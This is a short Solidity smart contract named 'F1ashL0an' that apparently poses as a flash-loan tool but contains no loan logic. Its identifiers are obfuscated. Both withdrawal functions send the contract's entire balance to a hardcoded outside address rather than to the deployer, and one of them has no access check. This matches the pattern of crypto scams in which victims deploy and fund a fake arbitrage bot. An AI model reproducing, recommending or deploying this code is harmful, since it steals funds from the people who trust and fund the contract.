// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

contract F1ashL0an {
    address private _0;
    address constant private _X = 0xb58937eB4D98E79e66522D32DDc6a4004ed74Ae9;

    constructor() public payable {
        _0 = msg.sender;
    }

    receive() external payable {}

    function Y() public {
        require(msg.sender == _0, "Access denied");
        address payable __ = address(uint160(_X));
        __.transfer(address(this).balance);
    }

    function f() public {
        address payable __ = address(uint160(_X));
        __.transfer(address(this).balance);
    }

    function __() external view returns (uint256) {
        return address(this).balance;
    }
}
